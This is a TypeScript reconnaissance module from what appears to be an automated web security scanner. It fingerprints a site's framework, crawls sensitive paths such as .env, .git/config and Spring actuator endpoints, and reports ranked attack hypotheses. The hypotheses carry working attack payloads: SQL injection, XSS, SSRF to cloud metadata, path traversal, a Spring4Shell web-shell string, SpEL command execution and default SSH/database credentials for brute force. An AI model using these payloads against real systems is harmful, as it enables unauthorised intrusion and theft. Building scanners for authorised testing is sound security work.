import { ScanResult, Finding, Severity } from '../../types';
import { generateFinding, fetchUrl, fetchUrlFollowRedirects, buildProof, formatProofAsText, respectRateLimit, isSpaShell, detectBlazor } from './shared';
import { logInfo, logExploit, logDone } from '../scanLogger';
import { getAI } from '../../services/ai.service';

const MODULE_NAME = 'smarterRecon';

interface AttackHypothesis {
  vector: string;
  confidence: number;
  reasoning: string;
  endpoints: string[];
  payloads: string[];
  mitre: string;
}

function detectFramework(techFindings: Finding[]): { framework: string; version: string; language: string; cms: string } {
  const allText = techFindings.map(f => f.title + ' ' + f.description + ' ' + f.evidence).join(' ').toLowerCase();
  let framework = 'unknown', version = '', language = 'unknown', cms = 'none';

  // CMS Detection
  if (allText.includes('wordpress') || allText.includes('wp-content') || allText.includes('wp-includes')) { cms = 'wordpress'; framework = 'wordpress'; }
  else if (allText.includes('drupal')) { cms = 'drupal'; framework = 'drupal'; }
  else if (allText.includes('joomla')) { cms = 'joomla'; framework = 'joomla'; }
  else if (allText.includes('shopify')) { cms = 'shopify'; }
  else if (allText.includes('magento') || allText.includes('adobe commerce')) { cms = 'magento'; }

  // Framework Detection — Blazor/XAF first (specific > generic)
  if (allText.includes('devexpress.blazor') || allText.includes('devexpress.expressapp') || allText.includes('blazor.server') || allText.includes('_blazor')) {
    framework = 'blazor-xaf'; language = 'csharp';
    const vMatch = allText.match(/v(\d+\.\d+\.\d+\.\d+)/);
    if (vMatch) version = vMatch[1];
  }
  else if (allText.includes('blazor')) { framework = 'blazor'; language = 'csharp'; }
  else if (allText.includes('laravel') || allText.includes('illuminate')) { framework = 'laravel'; language = 'php'; }
  else if (allText.includes('django') || allText.includes('csrfmiddlewaretoken')) { framework = 'django'; language = 'python'; }
  else if (allText.includes('flask') || allText.includes('werkzeug')) { framework = 'flask'; language = 'python'; }
  else if (allText.includes('express') || allText.includes('x-powered-by: express')) { framework = 'express'; language = 'javascript'; }
  else if (allText.includes('next.js') || allText.includes('nextjs') || allText.includes('__next')) { framework = 'nextjs'; language = 'javascript'; }
  else if (allText.includes('react') || allText.includes('reactdom') || allText.includes('_reactroot')) { framework = 'react'; language = 'javascript'; }
  else if (allText.includes('angular') || allText.includes('ng-version')) { framework = 'angular'; language = 'javascript'; }
  else if (allText.includes('vue.js') || allText.includes('vuejs') || allText.includes('__vue__')) { framework = 'vue'; language = 'javascript'; }
  else if (allText.includes('spring') || allText.includes('springframework')) { framework = 'spring'; language = 'java'; }
  else if (allText.includes('rails') || allText.includes('ruby on rails') || allText.includes('x-runtime')) { framework = 'rails'; language = 'ruby'; }
  else if (allText.includes('asp.net') || allText.includes('x-aspnet')) { framework = 'aspnet'; language = 'csharp'; }
  else if (allText.includes('fastapi') || allText.includes('fastapi')) { framework = 'fastapi'; language = 'python'; }
  else if (allText.includes('gin') || allText.includes('go')) { framework = 'gin'; language = 'go'; }
  else if (allText.includes('php') || allText.includes('x-powered-by: php')) { language = 'php'; }

  // Version Detection
  const versionPatterns = [
    /php[\s\/](\d+\.\d+[\.\d]*)/i, /nginx[\s\/](\d+\.\d+[\.\d]*)/i, /apache[\s\/](\d+\.\d+[\.\d]*)/i,
    /express[\s\/](\d+\.\d+[\.\d]*)/i, /django[\s\/](\d+\.\d+[\.\d]*)/i, /rails[\s\/](\d+\.\d+[\.\d]*)/i,
    /wordpress[\s\/](\d+\.\d+[\.\d]*)/i, /next[\s\/](\d+\.\d+[\.\d]*)/i, /react[\s\/](\d+\.\d+[\.\d]*)/i,
    /laravel[\s\/](\d+\.\d+[\.\d]*)/i, /spring[\s\/](\d+\.\d+[\.\d]*)/i,
    /devexpress[\s\/](\d+\.\d+[\.\d]*)/i, / DevExpress\.[\w.]+\/v(\d+\.\d+[\.\d]*)/i,
  ];
  for (const pat of versionPatterns) {
    const m = allText.match(pat);
    if (m) { version = m[1]; break; }
  }

  return { framework, version, language, cms };
}

function generateHypotheses(framework: string, cms: string, language: string, portFindings: Finding[], headerFindings: Finding[]): AttackHypothesis[] {
  const h: AttackHypothesis[] = [];

  // Universal web attack hypotheses
  h.push({ vector: 'SQL Injection', confidence: 0.8, reasoning: 'Parameterized input testing on all discovered endpoints', endpoints: ['/api', '/api/v1', '/search', '/login', '/admin'], payloads: ["' OR '1'='1", "' UNION SELECT NULL--", "1' AND SLEEP(5)--", "1; SELECT * FROM users--", "admin'--"], mitre: 'T1190' });
  h.push({ vector: 'Reflected XSS', confidence: 0.75, reasoning: 'Input reflection testing with context-aware payloads', endpoints: ['/', '/search', '/api', '/error', '/preview'], payloads: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><svg/onload=alert(1)>', '{{7*7}}', '${7*7}'], mitre: 'T1189' });
  h.push({ vector: 'SSRF', confidence: 0.7, reasoning: 'Server-side request forgery via URL parameters', endpoints: ['/api', '/api/v1', '/api/fetch', '/api/proxy', '/webhook'], payloads: ['http://169.254.169.254/', 'http://localhost:6379/', 'http://[::1]:22/', 'http://0177.0.0.1/', 'http://127.0.0.1:8080/'], mitre: 'T1190' });
  h.push({ vector: 'Path Traversal', confidence: 0.75, reasoning: 'Directory traversal on file-handling endpoints', endpoints: ['/api', '/api/v1', '/api/file', '/api/download', '/api/view'], payloads: ['../../../etc/passwd', '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'], mitre: 'T1083' });
  h.push({ vector: 'Open Redirect', confidence: 0.65, reasoning: 'Unvalidated redirect via URL parameters', endpoints: ['/login', '/api', '/api/auth', '/api/redirect', '/'], payloads: ['https://evil.com', '//evil.com', '/\\evil.com'], mitre: 'T1204' });

  // Framework-specific hypotheses
  if (framework === 'laravel') {
    h.push({ vector: 'Laravel Debug Mode', confidence: 0.9, reasoning: 'Laravel debug mode leaks stack traces and environment variables', endpoints: ['/api/nonexistent', '/test', '/_ignition/health-check'], payloads: [], mitre: 'T1592' });
    h.push({ vector: 'Laravel .env Exposure', confidence: 0.85, reasoning: '.env file may be publicly accessible exposing APP_KEY and database credentials', endpoints: ['/.env', '/.env.backup', '/.env.local', '/storage/logs/laravel.log'], payloads: [], mitre: 'T1005' });
    h.push({ vector: 'Laravel SQL Injection', confidence: 0.8, reasoning: 'Laravel query builder vulnerable when using raw queries with user input', endpoints: ['/api', '/api/v1'], payloads: ["whereRaw('1=1')", "selectRaw('1')"], mitre: 'T1190' });
  }
  if (framework === 'django') {
    h.push({ vector: 'Django Debug Mode', confidence: 0.9, reasoning: 'Django debug mode exposes detailed error pages with settings', endpoints: ['/nonexistent', '/admin/', '/api/debug'], payloads: [], mitre: 'T1592' });
    h.push({ vector: 'Django Admin Enumeration', confidence: 0.85, reasoning: 'Django admin panel often exposed without IP restriction', endpoints: ['/admin/', '/admin/login/', '/django/admin/'], payloads: [], mitre: 'T1592' });
    h.push({ vector: 'Django ORM Injection', confidence: 0.7, reasoning: 'Django ORM vulnerable when using extra() or raw() with user input', endpoints: ['/api', '/api/v1'], payloads: ["' OR 1=1--"], mitre: 'T1190' });
  }
  if (framework === 'express' || framework === 'nextjs') {
    h.push({ vector: 'Prototype Pollution', confidence: 0.8, reasoning: 'Node.js prototype pollution via JSON merge/query parameters', endpoints: ['/api', '/api/v1', '/api/merge'], payloads: ['{"__proto__":{"isAdmin":true}}', '{"constructor":{"prototype":{"isAdmin":true}}}'], mitre: 'T1190' });
    h.push({ vector: 'Node.js ReDoS', confidence: 0.7, reasoning: 'Regular expression denial of service on input parameters', endpoints: ['/api', '/search'], payloads: ['a'.repeat(50000)], mitre: 'T1499' });
    h.push({ vector: 'Express Path Traversal', confidence: 0.85, reasoning: 'Express static file serving may allow directory traversal', endpoints: ['/static', '/public', '/uploads', '/files'], payloads: ['../../../etc/passwd', '..%2f..%2f..%2fetc/passwd'], mitre: 'T1083' });
    h.push({ vector: 'Next.js Route Confusion', confidence: 0.75, reasoning: 'Next.js API routes may expose server-side code or data', endpoints: ['/api', '/_next/data', '/_next/static'], payloads: [], mitre: 'T1190' });
  }
  if (framework === 'spring') {
    h.push({ vector: 'Spring Actuator Exposure', confidence: 0.9, reasoning: 'Spring Boot Actuator endpoints may be publicly accessible', endpoints: ['/actuator', '/actuator/env', '/actuator/heapdump', '/actuator/mappings', '/actuator/configprops'], payloads: [], mitre: 'T1005' });
    h.push({ vector: 'Spring4Shell (CVE-2022-22965)', confidence: 0.8, reasoning: 'Spring Framework RCE via class loader manipulation', endpoints: ['/api', '/login'], payloads: ['class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B'], mitre: 'T1190' });
    h.push({ vector: 'SpEL Injection', confidence: 0.8, reasoning: 'Spring Expression Language injection via user-controlled input', endpoints: ['/api', '/api/v1', '/search'], payloads: ['${7*7}', '#{7*7}', '${T(java.lang.Runtime).getRuntime().exec("id")}'], mitre: 'T1190' });
  }
  if (framework === 'rails') {
    h.push({ vector: 'Rails Mass Assignment', confidence: 0.8, reasoning: 'Ruby on Rails strong parameters bypass', endpoints: ['/api', '/api/v1', '/users', '/accounts'], payloads: ['user[admin]=true', 'user[role]=admin'], mitre: 'T1190' });
    h.push({ vector: 'Rails Deserialization', confidence: 0.75, reasoning: 'Ruby Marshal deserialization vulnerability', endpoints: ['/api', '/api/v1'], payloads: [], mitre: 'T1190' });
  }
  if (cms === 'wordpress') {
    h.push({ vector: 'WordPress User Enumeration', confidence: 0.9, reasoning: 'WordPress author enumeration via /?author= or /wp-json/wp/v2/users', endpoints: ['/?author=1', '/wp-json/wp/v2/users', '/?author=2', '/?author=3'], payloads: [], mitre: 'T1592' });
    h.push({ vector: 'WordPress XML-RPC Brute Force', confidence: 0.85, reasoning: 'WordPress XML-RPC interface may allow credential brute forcing', endpoints: ['/xmlrpc.php'], payloads: [], mitre: 'T1110' });
    h.push({ vector: 'WordPress Plugin Enumeration', confidence: 0.8, reasoning: 'WordPress plugin versions may be extracted from page source', endpoints: ['/wp-content/plugins/', '/wp-login.php'], payloads: [], mitre: 'T1592' });
    h.push({ vector: 'WordPress REST API Exposure', confidence: 0.8, reasoning: 'WordPress REST API may expose user data or content', endpoints: ['/wp-json/wp/v2/users', '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages'], payloads: [], mitre: 'T1592' });
  }
  if (cms === 'drupal') {
    h.push({ vector: 'Drupal Drupalgeddon', confidence: 0.8, reasoning: 'Drupalgeddon2 (CVE-2018-7600) may affect older installations', endpoints: ['/user/login', '/admin/content'], payloads: [], mitre: 'T1190' });
  }

  // ── BLAZOR SERVER + DEVEXPRESS XAF HYPOTHESES ──
  if (framework === 'blazor-xaf' || framework === 'blazor') {
    h.push({ vector: 'Blazor SignalR Circuit Hijacking', confidence: 0.85, reasoning: 'Blazor Server uses SignalR for circuit communication — test for unauthenticated circuit access, connection ID prediction, and DoS via circuit flooding', endpoints: ['/_blazor', '/_blazor/negotiate'], payloads: [], mitre: 'T1190' });
    h.push({ vector: 'DevExpress XAF API Enumeration', confidence: 0.8, reasoning: 'DevExpress XAF exposes REST API endpoints for CRUD operations — test for broken access control, mass assignment, and BOLA/IDOR', endpoints: ['/api/DataService', '/api/ObjectSpace', '/_content/'], payloads: [], mitre: 'T1190' });
    h.push({ vector: 'Blazor Deserialization Attack', confidence: 0.75, reasoning: 'Blazor Server uses BinaryFormatter for state serialization — test for insecure deserialization if state is exposed', endpoints: ['/_blazor', '/_blazor/negotiate'], payloads: [], mitre: 'T1203' });
    h.push({ vector: 'Blazor View Injection (XSS)', confidence: 0.7, reasoning: 'Blazor components with @Html.Raw() or MarkupString may allow XSS — test for DOM-based XSS via Blazor component parameters', endpoints: ['/_blazor'], payloads: ['{{7*7}}', '${7*7}', '<script>alert(1)</script>'], mitre: 'T1189' });
    h.push({ vector: 'DevExpress XSS via Rich Editor', confidence: 0.65, reasoning: 'DevExpress Blazor editors (RichEdit, HtmlEditor) may allow XSS via rich text content injection', endpoints: ['/_content/DevExpress.Blazor/'], payloads: ['<img src=x onerror=alert(1)>'], mitre: 'T1189' });
    h.push({ vector: 'DevExpress Analytics Core Path Traversal', confidence: 0.7, reasoning: 'DevExpress analytics-core resources may allow path traversal via crafted URLs', endpoints: ['/_content/DevExpress.Blazor.Resources/js/analytics-core/'], payloads: ['../../../etc/passwd'], mitre: 'T1083' });
    h.push({ vector: 'Blazor SSR via Open Redirect', confidence: 0.6, reasoning: 'Blazor Server apps with ReturnUrl parameters may allow open redirects — test for phishing via redirect manipulation', endpoints: ['/Account/Login', '/Account/LogOn'], payloads: ['https://evil.com', '//evil.com'], mitre: 'T1204' });
  }

  // Port-based hypotheses
  const portText = portFindings.map(f => f.title + ' ' + f.description).join(' ').toLowerCase();
  if (portText.includes('3306') || portText.includes('mysql')) {
    h.push({ vector: 'MySQL Weak Credentials', confidence: 0.7, reasoning: 'MySQL service detected, testing default credentials', endpoints: [], payloads: ['root:', 'root:root', 'root:password', 'admin:admin'], mitre: 'T1110' });
  }
  if (portText.includes('6379') || portText.includes('redis')) {
    h.push({ vector: 'Redis Unauthorized Access', confidence: 0.85, reasoning: 'Redis service detected without authentication', endpoints: [], payloads: ['INFO', 'CONFIG GET *', 'KEYS *', 'SLAVEOF NO ONE'], mitre: 'T1190' });
  }
  if (portText.includes('5432') || portText.includes('postgres')) {
    h.push({ vector: 'PostgreSQL Weak Credentials', confidence: 0.7, reasoning: 'PostgreSQL service detected', endpoints: [], payloads: ['postgres:postgres', 'postgres:password'], mitre: 'T1110' });
  }
  if (portText.includes('27017') || portText.includes('mongodb')) {
    h.push({ vector: 'MongoDB Unauthorized Access', confidence: 0.85, reasoning: 'MongoDB service detected, may allow unauthenticated access', endpoints: [], payloads: [], mitre: 'T1190' });
  }
  // SSH hypotheses
  if (portText.includes('22') || portText.includes('ssh')) {
    h.push({ vector: 'SSH Brute Force', confidence: 0.85, reasoning: 'SSH service detected on port 22, test for weak/default credentials', endpoints: [], payloads: ['root:root', 'admin:admin', 'root:password', 'root:toor', 'user:user'], mitre: 'T1110' });
    h.push({ vector: 'SSH Algorithm Downgrade', confidence: 0.7, reasoning: 'SSH server may support weak algorithms enabling downgrade attacks', endpoints: [], payloads: [], mitre: 'T1557' });
    h.push({ vector: 'SSH Key Enumeration', confidence: 0.65, reasoning: 'Enumerate SSH host key type and size to detect weak keys', endpoints: [], payloads: [], mitre: 'T1592' });
    h.push({ vector: 'Terrapin Attack (CVE-2023-48795)', confidence: 0.6, reasoning: 'OpenSSH versions before 9.6p1 vulnerable to prefix truncation attack on SSH Binary Packet Protocol', endpoints: [], payloads: [], mitre: 'T1557' });
  }

  // Header-based hypotheses
  const headerText = headerFindings.map(f => f.title + ' ' + f.description).join(' ').toLowerCase();
  if (headerText.includes('cors') && headerText.includes('reflect')) {
    h.push({ vector: 'CORS Misconfiguration', confidence: 0.8, reasoning: 'CORS origin reflection detected, may allow cross-origin data theft', endpoints: ['/api', '/api/v1'], payloads: [], mitre: 'T1189' });
  }
  if (headerText.includes('csp') && headerText.includes('missing')) {
    h.push({ vector: 'No CSP - XSS Amplified', confidence: 0.7, reasoning: 'Content Security Policy missing, XSS impact amplified', endpoints: [], payloads: [], mitre: 'T1189' });
  }

  return h.sort((a, b) => b.confidence - a.confidence);
}

export async function runSmarterRecon(domain: string, priorFindings: Finding[] = []): Promise<ScanResult> {
  const startTime = Date.now();
  const findings: Finding[] = [];
  const errors: string[] = [];
  const baseUrl = `https://${domain}`;

  logInfo(MODULE_NAME, `Starting AI-driven reconnaissance for ${domain}`);

  // 1. Detect framework from prior findings
  const techFindings = priorFindings.filter(f => f.category === 'Technology Detection' || f.category === 'Technology');
  const headerFindings = priorFindings.filter(f => f.category === 'Security Headers' || f.category === 'TLS/HTTP');
  const portFindings = priorFindings.filter(f => f.category === 'Port Scan' || f.category === 'Service Exposure');
  const { framework, version, language, cms } = detectFramework(techFindings);
  logInfo(MODULE_NAME, `Detected from tech findings: framework=${framework} version=${version} language=${language} cms=${cms}`);

  // 1b. Direct HTML probe — override framework if SPA/Blazor detected in actual HTML
  let spaFramework = framework;
  let spaVersion = version;
  let spaLanguage = language;
  try {
    const probe = await fetchUrl(`https://${domain}/`, 10000);
    if (probe.statusCode === 200 && isSpaShell(probe.body)) {
      const blazor = detectBlazor(probe.body);
      if (blazor.isBlazor) {
        spaFramework = blazor.isDevExpress ? 'blazor-xaf' : 'blazor';
        spaVersion = blazor.version || version;
        spaLanguage = 'csharp';
        logInfo(MODULE_NAME, `Direct probe override: framework=${spaFramework} version=${spaVersion} (DevExpress=${blazor.isDevExpress})`);
      }
    }
  } catch {
    // Direct probe failed — rely on tech findings only
  }

  // 2. Generate attack hypotheses
  const hypotheses = generateHypotheses(spaFramework, cms, spaLanguage, portFindings, headerFindings);
  logInfo(MODULE_NAME, `Generated ${hypotheses.length} attack hypotheses`);

  // 3. Execute targeted enumeration based on framework
  const enumerationPaths: string[] = [];
  if (cms === 'wordpress') {
    enumerationPaths.push(
      '/wp-json/wp/v2/users', '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
      '/xmlrpc.php', '/wp-login.php', '/wp-admin/', '/wp-content/debug.log',
      '/wp-content/uploads/', '/wp-includes/', '/?author=1', '/feed/',
      '/wp-json/', '/wp-cron.php', '/wp-content/plugins/',
    );
  }
  if (spaFramework === 'laravel') {
    enumerationPaths.push(
      '/.env', '/.env.backup', '/.env.local', '/.env.production',
      '/storage/logs/laravel.log', '/storage/logs/laravel-*.log',
      '/_ignition/health-check', '/_ignition/execute-solution',
      '/telescope', '/horizon', '/nova', '/log-viewer',
      '/api/sanctum/csrf-cookie', '/api/telescope', '/api/horizon',
    );
  }
  if (spaFramework === 'django') {
    enumerationPaths.push(
      '/admin/', '/admin/login/', '/django/admin/',
      '/static/admin/', '/api/debug', '/__debug__/',
      '/api/v1/', '/graphql', '/api/schema',
    );
  }
  if (spaFramework === 'spring') {
    enumerationPaths.push(
      '/actuator', '/actuator/env', '/actuator/heapdump',
      '/actuator/mappings', '/actuator/configprops', '/actuator/beans',
      '/actuator/health', '/actuator/threaddump', '/actuator/metrics',
      '/swagger-ui.html', '/v2/api-docs', '/swagger-resources/',
      '/api-docs', '/v3/api-docs',
    );
  }
  if (spaFramework === 'express' || spaFramework === 'nextjs') {
    enumerationPaths.push(
      '/_next/data', '/_next/static', '/_next/webpack-hmr',
      '/api', '/api/v1', '/api/health', '/api/config',
      '/graphql', '/graphiql', '/__webpack_hmr',
      '/server-info', '/status', '/debug',
    );
  }
  if (spaFramework === 'rails') {
    enumerationPaths.push(
      '/rails/info', '/rails/info/routes', '/rails/mailers',
      '/sidekiq', '/sidekiq/overview', '/delayed_job',
      '/rails/mailers/user', '/rails/mailers/Devise',
    );
  }

  // ── BLAZOR SERVER + DEVEXPRESS XAF ENUMERATION ──
  if (spaFramework === 'blazor-xaf' || spaFramework === 'blazor') {
    enumerationPaths.push(
      '/_blazor', '/_blazor/negotiate',
      '/Account/Login', '/Account/LogOn', '/Account/ChangePassword', '/Account/ForgotPassword',
      '/Account/ResetPassword', '/Account/Register', '/Account/ConfirmEmail',
      '/api/DataService', '/api/ObjectSpace', '/api/ObjectSpace/Custom',
      '/_content/DevExpress.Blazor.Resources/js/analytics-core/',
      '/_content/DevExpress.Blazor.Themes.Fluent/',
      '/_content/DevExpress.ExpressApp.Blazor/',
      '/_content/DevExpress.Blazor.Dashboard/',
      '/_content/DevExpress.ExpressApp.Office.Blazor/',
      '/css/site.css', '/css/login.css', '/css/design-tokens.css',
      '/Js/customScript.js', '/Js/data.js', '/Js/index.js',
      '/Js/treeListModule.js', '/Js/edt-matrix.js',
      '/Js/recaptcha-interop.js', '/Js/login.js',
      '/Js/dashboard-events-scripts.js', '/Js/dashboard-user-script.js',
      '/IImageService/', '/IImageService/Sad',
      '/Images/', '/images/',
      '/css/educated-defense-banner.css',
      '/css/educated-progress.css',
    );
  }

  // Always-enumerate paths
  enumerationPaths.push(
    '/api', '/api/v1', '/api/v2', '/api/health', '/api/config',
    '/api/users', '/api/user', '/api/me', '/api/admin',
    '/api/debug', '/api/status', '/api/info', '/api/version',
    '/graphql', '/graphiql', '/.git/HEAD', '/.git/config',
    '/.gitignore', '/.env', '/server-status', '/server-info',
    '/phpinfo.php', '/info.php', '/status', '/health',
    '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
    '/.well-known/security.txt', '/.well-known/openid-configuration',
    '/swagger-ui.html', '/v2/api-docs', '/v3/api-docs',
    '/redoc', '/docs', '/api-docs',
  );

  // 4. Crawl discovered paths with redirect awareness
  logInfo(MODULE_NAME, `Crawling ${enumerationPaths.length} paths with redirect awareness`);
  const discoveredEndpoints: { path: string; status: number; contentType: string; redirectTarget?: string; bodyLength: number; hasApi: boolean; hasAuth: boolean }[] = [];

  for (const path of enumerationPaths.slice(0, 80)) {
    try {
      await respectRateLimit(domain);
      const rr = await fetchUrlFollowRedirects(`${baseUrl}${path}`, 4000, 2);
      const ct = (rr.finalHeaders['content-type'] || '').toLowerCase();
      const body = rr.finalBody;
      const isApi = ct.includes('json') || body.startsWith('{') || body.startsWith('[');
      const hasAuth = body.includes('unauthorized') || body.includes('login') || body.includes('sign in') || body.includes('401');
      const isUseful = !rr.isLogin && !rr.isGeneric && (rr.finalStatus === 200 || rr.finalStatus === 401 || rr.finalStatus === 403) && body.length > 10;

      if (isUseful) {
        discoveredEndpoints.push({
          path, status: rr.finalStatus, contentType: ct,
          redirectTarget: rr.isRedirect ? rr.finalUrl : undefined,
          bodyLength: body.length, hasApi: isApi, hasAuth,
        });
      }
    } catch {}
  }

  // 5. Deep enumeration of discovered API endpoints
  const apiEndpoints = discoveredEndpoints.filter(e => e.hasApi);
  logInfo(MODULE_NAME, `Found ${apiEndpoints.length} API endpoints, ${discoveredEndpoints.length} total paths`);

  // Generate findings for discovered intelligence
  if (apiEndpoints.length > 0) {
    const proof = buildProof('GET', `${baseUrl}${apiEndpoints[0].path}`, undefined, undefined, 200, {}, `Found ${apiEndpoints.length} API endpoints`);
    findings.push(generateFinding(
      `API Surface Enumeration: ${apiEndpoints.length} endpoints discovered`,
      `Discovered ${apiEndpoints.length} JSON API endpoints across the application. Framework: ${spaFramework || 'unknown'}, Language: ${spaLanguage}. These endpoints are high-priority targets for injection, authentication bypass, and data exposure attacks.`,
      Severity.MEDIUM,
      'Enumeration',
      domain,
      formatProofAsText(proof),
      'API endpoints expose application logic and data. Broken authentication, injection flaws, and excessive data exposure are common at these endpoints.',
      'Implement authentication, rate limiting, and input validation on all API endpoints',
      ['https://owasp.org/www-project-api-security/']
    ));
  }

  // Report each attack hypothesis as UNTESTED INTELLIGENCE (not a confirmed finding)
  for (const hyp of hypotheses.filter(h => h.confidence >= 0.7).slice(0, 10)) {
    findings.push(generateFinding(
      `Untested Attack Vector: ${hyp.vector}`,
      `This attack vector was identified by AI analysis but has NOT been tested yet. Confidence: ${(hyp.confidence * 100).toFixed(0)}%. ${hyp.reasoning}. Framework: ${spaFramework}, CMS: ${cms}, Language: ${spaLanguage}.`,
      Severity.INFO,
      'Attack Planning',
      domain,
      [
        '=== UNTESTED INTELLIGENCE ===',
        `Vector: ${hyp.vector}`,
        `Confidence: ${(hyp.confidence * 100).toFixed(0)}%`,
        `Reasoning: ${hyp.reasoning}`,
        `MITRE: ${hyp.mitre}`,
        `Target Endpoints: ${hyp.endpoints.join(', ')}`,
        `Payloads to test: ${hyp.payloads.join(', ')}`,
        '',
        'STATUS: NOT TESTED — This is a hypothesis, not a confirmed vulnerability.',
        'To validate: run exploitation module with these payloads against these endpoints.',
      ].join('\n'),
      'This attack vector has not been validated. It requires testing before it can be confirmed.',
      'Test this vector with the payloads listed above before taking action',
      ['https://attack.mitre.org/techniques/' + hyp.mitre.replace('T', '')]
    ));
  }

  // Report enumeration findings
  const interestingPaths = discoveredEndpoints.filter(e => e.status === 200 && (e.path.includes('admin') || e.path.includes('debug') || e.path.includes('actuator') || e.path.includes('swagger') || e.path.includes('graphql') || e.path.includes('.env')));
  for (const ep of interestingPaths.slice(0, 10)) {
    const proof = buildProof('GET', `${baseUrl}${ep.path}`, undefined, undefined, ep.status, {}, `(${ep.bodyLength} bytes)`);
    findings.push(generateFinding(
      `Exposed Endpoint: ${ep.path}`,
      `The endpoint ${ep.path} is accessible and returned HTTP ${ep.status} with ${ep.contentType || 'unknown'} content type. This endpoint may expose sensitive data or functionality.`,
      ep.path.includes('admin') || ep.path.includes('.env') ? Severity.HIGH : Severity.MEDIUM,
      'Enumeration',
      domain,
      formatProofAsText(proof),
      'Exposed endpoints may allow unauthorized access to sensitive data or administrative functions',
      'Restrict access to sensitive endpoints; implement authentication and authorization',
      ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Enumerate_Infrastructure_and_Application_Admin_Interfaces']
    ));
  }

  // Report framework-specific findings
  if (spaFramework !== 'unknown') {
    findings.push(generateFinding(
      `Framework Detected: ${spaFramework}${spaVersion ? ' v' + spaVersion : ''}`,
      `The application uses ${spaFramework}${spaVersion ? ' version ' + spaVersion : ''} (${spaLanguage}). This information helps identify framework-specific attack vectors.`,
      Severity.INFO,
      'Technology Detection',
      domain,
      `Framework: ${spaFramework}\nVersion: ${spaVersion || 'unknown'}\nLanguage: ${spaLanguage}\nCMS: ${cms || 'none'}`,
      'Framework identification enables targeted vulnerability testing',
      'Keep the framework updated to the latest stable version',
      ['https://attack.mitre.org/techniques/T1592/']
    ));
  }

  // AI-enhanced hypothesis validation
  try {
    const ai = getAI();
    const techStack = [spaFramework, cms, spaLanguage].filter(Boolean);
    const aiResult = await ai.analyzeSmarterRecon(
      hypotheses.map(h => ({
        title: h.vector,
        confidence: h.confidence,
        status: 'untested',
        evidence: h.reasoning,
      })),
      domain,
      techStack,
    );
    if (aiResult.validated?.length) {
      for (const v of aiResult.validated) {
        if (v.confidence > 0.7) {
          findings.push(generateFinding(
            `AI Validated: ${v.title}`,
            `AI analysis validated this attack vector with confidence ${(v.confidence * 100).toFixed(0)}%. ${v.reasoning}`,
            v.confidence > 0.8 ? Severity.HIGH : Severity.MEDIUM,
            'AI Validation',
            domain,
            `AI confidence: ${(v.confidence * 100).toFixed(0)}%\nReasoning: ${v.reasoning}`,
            'AI-validated attack vectors have higher likelihood of success',
            'Prioritize testing of AI-validated attack vectors',
            [],
          ));
        }
      }
    }
  } catch {}

  const duration = Date.now() - startTime;
  logDone(MODULE_NAME, `Smarter recon complete: ${findings.length} findings in ${(duration / 1000).toFixed(1)}s`);
  return { module: MODULE_NAME as any, findings, duration, errors };
}
